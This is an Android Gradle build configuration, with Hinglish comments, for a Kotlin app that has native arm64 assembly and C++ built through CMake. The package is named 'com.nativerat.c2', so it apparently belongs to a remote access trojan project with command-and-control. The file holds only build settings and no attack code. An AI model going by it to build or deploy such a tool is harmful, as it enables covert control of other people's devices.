plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}

android {
    namespace 'com.nativerat.c2'
    compileSdk 34

    defaultConfig {
        applicationId "com.nativerat.c2"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"
        // sirf 64-bit — Assembly files arm64 ke liye hain
        ndk { abiFilters 'arm64-v8a' }
    }

    buildTypes {
        release {
            minifyEnabled false
            signingConfig signingConfigs.debug   // debug-signed; prod ke liye apna keystore lagao
        }
    }

    externalNativeBuild {
        cmake {
            path "src/main/cpp/CMakeLists.txt"
            version "3.22.1"
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = '17' }
}